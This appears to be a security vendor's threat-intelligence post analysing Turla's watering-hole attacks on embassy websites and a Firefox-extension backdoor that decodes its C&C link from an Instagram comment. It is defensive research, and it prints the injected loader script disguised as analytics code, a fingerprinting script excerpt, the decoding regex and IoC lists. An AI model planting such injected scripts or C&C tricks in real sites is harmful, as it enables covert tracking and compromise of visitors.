Apologies to Google and our readers for the unintentional_\n_misrepresentation in our original post._\n\nSome of the tactics used in APT attacks die hard. A good example is provided by Turla’s\nwatering hole campaigns. Turla, which has been targeting governments, government\n[officials and diplomats for years – see, as an example, this recent paper – is still using](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)\nwatering hole techniques to redirect potentially interesting victims to their C&C\ninfrastructure. In fact, they have been using them since at least 2014 with very few\nvariations in their modus operandi.\n\nA watering hole attack compromises websites that are likely to be visited by targets of\ninterest. The people behind Turla are apparently keen on targeting embassy websites.\n[Indeed, there was a February 2017 blogpost by Forcepoint highlighting some of the](https://blogs.forcepoint.com/security-labs/curious-case-reconnaissance-campaign-targeting-ministry-and-embassy-sites)\nwebsites most recently compromised.\n\nWe, of course, are monitoring the developments of these campaigns closely and recently\nnoticed them reusing a technique that we haven’t seen them use for several months.\n\n## Initial compromise\n\nIn the IoCs section below, there is a list of websites that have been used to redirect to Turla\nwatering hole C&Cs in the past. As is usual with this group, there are many websites\ndirectly related to embassies throughout the world.\n\nThe websites’ visitors will be redirected to a malicious server because of a snippet –\ninserted by the attacker – appended to the original page. The scripts we saw in the last few\nmonths were all similar to this one:\n\n\n-----\n\n<!– Clicky Web Analytics (start) –>\n<script type=”text/javascript”>// <![CDATA[\n\nvar clicky_site_ids = clicky_site_ids || [];\n\nclicky_site_ids.push(100673048);\n\n(function() {\n\nvar s = document.createElement(‘script’);\n\nvar a = ‘http://www.mentalhealthcheck.net/’;\n\nvar b = ‘update/counter.js’;\n\ns.type = ‘text/javascript’; s.async = true;\n\ns.src = ‘//static.getclicky.com/js’; s.src = a.concat(b);\n\n( document.getElementsByTagName(‘head’)[0] ||\ndocument.getElementsByTagName(‘body’)[0]).appendChild(s);\n\n})();\n\n// ]]></script>\n\nThe attackers added a reference to Clicky, a real time web analytics framework. They are\nadding this framework name in an attempt to legitimize the appended script to cursory, or\nnon-expert, examination, although it is not actually used in the attack. We can see here that\nthis injected script calls another script at mentalhealthcheck.net/update/counter.js. This is a\nserver the Turla gang has been using to push fingerprinting scripts – scripts that will gather\ninformation about the system it is running on – to interesting victims. A deceptive reference\nto the Google Analytics script was used in a similar fashion for a while, but now Clicky is\nwhat we see the most. You can find in the IoCs section the various watering hole C&Cs that\nwe saw in the last couple of months. All of these C&Cs are compromised legitimate servers.\n\nThe next step in the attack is to distribute a fingerprinting JavaScript to interesting targets.\nTo do this, the C&C is filtering visitors using an IP range. If they are within the targeted IP\nrange, they receive the fingerprinting script. If not, they just receive a benign script: a JS\nimplementation of the MD5 hashing algorithm. Below we show an excerpt of the\ndeobfuscated script that is received by victims coming from a targeted IP range:\n\n\n-----\n\nfunction cb_custom() {\nloadScript(“http://www.mentalhealthcheck.net/script/pde.js”, cb_custom1);\n\n}\n\nfunction cb_custom1() {\n\nPluginDetect.getVersion(‘.’);\n\nmyResults[‘Java’]=PluginDetect.getVersion(‘Java’);\n\nmyResults[‘Flash’]=PluginDetect.getVersion(‘Flash’);\n\nmyResults[‘Shockwave’]=PluginDetect.getVersion(‘Shockwave’);\n\nmyResults[‘AdobeReader’]=PluginDetect.getVersion(‘AdobeReader’) ||\nPluginDetect.getVersion(‘PDFReader’);\n\nvar ec = new evercookie();\n\nec.get(‘thread’, getCookie)\n\nThis javascript will download a JS library called PluginDetect that has the ability to collect\ninformation about plugins installed in the browser. The information collected is then sent to\nthe C&C server.\n\nIt will also try to install an evercookie, or so-called super cookie, that will track the user\nthroughout his browsing, across all sites on the internet.\n\nFor those familiar with this group’s waterholing techniques, it is clear they are still using their\nold, publicly known tried-and-true methods.\n\n## Firefox extension\n\nThrough our monitoring of these watering hole campaigns, we happened upon a very\n[interesting sample. Some of you may remember the Pacifier APT report by BitDefender](http://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender-Whitepaper-PAC-A4-en_EN1.pdf)\ndescribing a spearphishing campaign with a malicious Microsoft Word document sent to\n[several institutions worldwide. These malicious documents would then drop a backdoor. We](http://virusradar.com/en/glossary/backdoor)\nnow know that this report describes Skipper, a first stage backdoor used by the Turla gang.\n\nThat report also contains a description of a Firefox extension dropped by the same type of\nmalicious document. It turns out we have found what most likely is an update of this Firefox\nextension. It is a JavaScript backdoor, different in terms of implementation to the one\ndescribed in the Pacifier APT report, but with similar functionalities.\n\n\n-----\n\nWe noticed that this extension could have been distributed through a forged copy of a\nSwiss security company’s website. Unsuspecting visitors to this website were asked to\ninstall this malicious extension. The extension is a simple backdoor, but with an interesting\nway of fetching its C&C domain.\n\n## The use of Instagram\n\nThe extension uses a bit.ly URL to reach its C&C, but the URL path is nowhere to be found\nin the extension code. In fact, it will obtain this path by using comments posted on a specific\nInstagram post. The one that was used in the analyzed sample was a comment about a\nphoto posted to the Britney Spears official Instagram account.\n\n\n-----\n\n© [https://www.instagram.com/p/BO8gU41A45g/](https://www.instagram.com/p/BO8gU41A45g/)\n\nThe extension will look at each photo’s comment and will compute a custom hash value. If\nthe hash matches 183, it will then run this regular expression on the comment in order to\nobtain the path of the bit.ly URL:\n\n(?:\\\\u200d(?:#|@)(\\\\w)\n\nLooking at the photo’s comments, there was only one for which the hash matches 183. This\ncomment was posted on February 6, while the original photo was posted in early January.\nTaking the comment and running it through the regex, you get the following bit.ly URL:\n\nhttp://bit.ly/2kdhuHX\n\nLooking a bit more closely at the regular expression, we see it is looking for either @|# or\nthe Unicode character \\200d. This character is actually a non-printable character called\n‘Zero Width Joiner’, normally used to separate emojis. Pasting the actual comment or\nlooking at its source, you can see that this character precedes each character that makes\nthe path of the bit.ly URL:\n\n\n-----\n\nsmith2155<200d>#2hot ma<200d>ke lovei<200d>d to <200d>her, <200d>uupss\n<200d>#Hot <200d>#X\n\nWhen resolving this shortened link, it leads to static.travelclothes.org/dolR_1ert.php, which\nwas used in the past as a watering hole C&C by the Turla crew.\n\nAs is the case with all bit.ly links, it is possible to get statistics on who clicked the link.\n\nAs seen above, there were only 17 hits recorded on this link in February, right around the\ntime the comment was posted. However, this is quite a low number and might indicate that\nit was only a test run.\n\n## Technical analysis\n\nThis Firefox extension implements a simple backdoor. It will first gather information on the\nsystem it is running on and send it to the C&C, encrypted using AES. This is very similar to\nwhat the extension described in the Pacifier APT white paper is doing.\n\nThe backdoor component has the ability to run four different types of commands:\n\nexecute arbitrary file\nupload file to C&C\n\n\n-----\n\ndownload file from C&C\nread directory content – send a file listing, along with sizes and dates, to C&C\n\nWhile we believe this to be some type of test, the next version of the extension – if there is\none – is likely to be very different. There are several APIs that are used by the extension\nthat will disappear in future versions of Firefox.\n\nFor example, it uses XPCOM to write files to disk and sdk/system/child_process to launch a\nprocess. These can only be used by add-ons that will be superseded by WebExtensions\nstarting with Firefox 57. From that version onwards, Firefox will no longer load add-ons,\nthus preventing the use of these APIs.\n\n## Conclusion\n\nThe fact that the Turla actors are using social media as a way to obtain its C&C servers is\nquite interesting. This behavior has already been observed in the past by other threat crews\nsuch as the [Dukes. Attackers using social media to recover a C&C address are making life](https://www.welivesecurity.com/2014/05/20/miniduke-still-duking/)\nharder for defenders. Firstly, it is difficult to distinguish malicious traffic to social media from\nlegitimate traffic. Secondly, it gives the attackers more flexibility when it comes to changing\nthe C&C address as well as erasing all traces of it. It is also interesting to see that they are\nrecycling an old way of fingerprinting a victim and finding new ways to make the C&C\nretrieval a bit more difficult.\n\nFor any inquiries, or to make sample submissions related to the subject, contact us at:\n[threatintel@eset.com.](http://10.10.0.46/mailto:threatintel@eset.com)\n\n## Acknowledgements\n\nWe would like to thank Clement Lecigne from Google’s Threat Analysis Group for his help\nresearching this campaign.\n\n## IoCs\n\nFirefox extension hash\n\n**File name** **SHA-1**\n\nhtml5.xpi 5ba7532b4c89cc3f7ffe15b6c0e5df82a34c22ea\n\nhtml5.xpi 8e6c9e4582d18dd75162bcbc63e933db344c5680\n\nObserved compromised websites redirecting to fingerprinting servers\n\nAs of this writing all these sites are now clean or pointing to dead fingerprinting servers.\n\n\n-----\n\n**URLURL** **DescriptionDescription**\n\nhxxp://www.namibianembassyusa.org Namibia Embassy – USA\n\nhxxp://www.avsa.org African Violet Society of America\n\nhxxp://www.zambiaembassy.org Zambian Embassy – USA\n\nhxxp://russianembassy.org Russian Embassy – USA\n\nhxxp://au.int African Union\n\nhxxp://mfa.gov.kg Ministry of Foreign Affairs – Kyrgyzstan\n\nhxxp://mfa.uz Ministry of Foreign Affairs – Uzbekistan\n\nhxxp://www.adesyd.es ADESyD - Asociación de Diplomados Españoles\nen Seguridad y Defensa\n\nhxxp://www.bewusstkaufen.at web portal for sustainable consumption in Austria\n\nhxxp://www.cifga.es Cifga Laboratory working on development of\nmarine toxin standards\n\nhxxp://www.jse.org Juventudes Socialistas de España (JSE)\n\nhxxp://www.embassyofindonesia.org Embassy of Indonesia – USA\n\nhxxp://www.mischendorf.at town of Mischendorf – Austria\n\nhxxp://www.vfreiheitliche.at Political party in Bregenz, Austria\n\nhxxp://www.xeneticafontao.com Fontao Genetics, S.A. established in 1998 is\nresponsible for the management of the Centre for\nAnimal Selection and Reproduction of Galicia\nbreeds Holstein, Rubia Gallega\n\nhxxp://iraqiembassy.us Embassy of Iraq – USA\n\nhxxp://sai.gov.ua Management of road safety (Ukraine)\n\nhxxp://www.mfa.gov.md Ministry of Foreign Affairs – Moldova\n\nhxxp://mkk.gov.kg State Personnel Service - Kyrgyzstan\n\n## Compromised websites used as first stage C&C in watering hole campaigns\n\nhxxp://www.mentalhealthcheck.net/update/counter.js (hxxp://bitly.com/2hlv91v+)\nhxxp://www.mentalhealthcheck.net/script/pde.js\nhxxp://drivers.epsoncorp.com/plugin/analytics/counter.js\n\n\n-----\n\nhxxp://rss.nbcpost.com/news/today/content.php\nhxxp://static.travelclothes.org/main.js\nhxxp://msgcollection.com/templates/nivoslider/loading.php\nhxxp://versal.media/?atis=509\nhxxp://www.ajepcoin.com/UserFiles/File/init.php (hxxp://bit.ly/2h8Lztj+)\nhxxp://loveandlight.aws3.net/wp-includes/theme-compat/akismet.php\nhxxp://alessandrosl.com/core/modules/mailer/mailer.php\n\n_[Image credits: ©David Robson/Flickr](https://www.flickr.com/photos/boldonian/16437893146/in/photostream/lightbox/)_\n\n6 Jun 2017 - 02:00PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
